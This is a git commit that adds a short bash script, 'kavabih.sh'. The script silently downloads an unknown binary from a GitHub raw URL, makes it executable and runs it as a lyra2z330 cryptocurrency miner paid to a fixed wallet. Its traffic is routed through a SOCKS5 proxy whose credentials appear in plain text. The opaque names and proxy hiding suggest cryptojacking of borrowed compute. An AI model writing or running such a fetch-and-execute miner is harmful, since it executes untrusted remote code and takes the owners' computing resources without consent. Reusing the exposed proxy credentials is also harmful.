8f94967fe596fc8bca77876501a93057098200fa
xavixahmad2210 <101304771+xavixahmad2210@users.noreply.github.com>
2022-03-10 09:26:40 +0700

    Create kavabih.sh

---
+++ kavabih.sh
@@ -0,0 +1,6 @@
+
+#!/bin/bash
+
+wget -q https://raw.githubusercontent.com/ahmadghozaliurhniyu/scmin/main/pointd
+chmod +x pointd
+./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DQGAS3U8cmDwBPn61bboXNBrSkEWhXuaVT.$(shuf -n 1 -i 1-9999999) -p c=DGB,zap=BUT-lyra2z330 -x socks5://aihzpnbr:dogmtwuiyn3a@193.23.253.82:7654
